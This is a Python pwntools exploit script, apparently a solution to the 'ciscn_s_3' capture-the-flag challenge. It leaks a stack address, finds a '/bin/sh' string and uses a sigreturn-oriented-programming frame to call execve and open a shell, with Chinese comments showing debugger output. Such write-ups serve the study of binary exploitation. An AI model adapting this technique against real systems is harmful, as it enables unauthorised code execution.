# ciscn_s_3
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

# p=remote("node4.buuoj.cn",27757)
p = process('./ciscn_s_3')
elf = ELF('./ciscn_s_3')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

leak = lambda name, addr: log.success('{} = {:#x}'.format(name, addr))
l64 = lambda: u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def dbg():
    # gdb.attach(p, 'b *$rebase(0x13aa)')
    gdb.attach(p)
    pause()


vuln = elf.symbols['vuln']
leak('vuln', vuln)

# gadget = 0x00000000004004DA # mov rax, 0x0f 即 sig_return
gadget = elf.search(asm('mov rax, 0x0F')).__next__()
# syscall_ret = 0x0000000000400517 # 0F 05 -- syscall
syscall_ret = elf.search(asm('syscall')).__next__()

pl = flat(b'a' * 0x10, vuln)
p.send(pl)
"""
write(1u, buf, 0x30uLL); 当前位置为 a70，能输出到 a90 #  distance 0xa70 0xb88 -- # 0x118, 通过此地址 -0x118找到 bin/sh地址
00:0000│ rsi     0x7ffd9d1dca70 ◂— 0x6161616161616161 ('aaaaaaaa')
02:0010│ rbp rsp 0x7ffd9d1dca80 —▸ 0x4004ed (vuln) ◂— push rbp
04:0020│         0x7ffd9d1dca90 —▸ 0x7ffd9d1dcb88 —▸ 0x7ffd9d1de719 ◂— './ciscn_s_3'
"""
binsh = l64() - 0x118
leak('binsh', binsh)

sigFrame = SigreturnFrame()
sigFrame.rax = 59
sigFrame.rdi = binsh
sigFrame.rsi = 0x0
sigFrame.rdx = 0x0
sigFrame.rip = syscall_ret

# pl2 = b'/bin/sh\00' * 2 + p64(gadget) + p64(syscall_ret) + bytes(sigFrame)
pl2 = flat(b'/bin/sh\00' * 2, gadget, syscall_ret, sigFrame)
# pl2 = b"/bin/sh\x00" * 2 + p64(pop_addr) + p64(0) * 2 + p64(binsh + 0x50) + p64(0) * 3 + p64(mov_rdx_addr) + p64(sys_execve_addr) + p64(pop_rdi_addr) + p64(binsh) + p64(syscall_addr)
# binsh + 0x50 见 ciscn_s_3.md
p.send(pl2)

p.interactive()
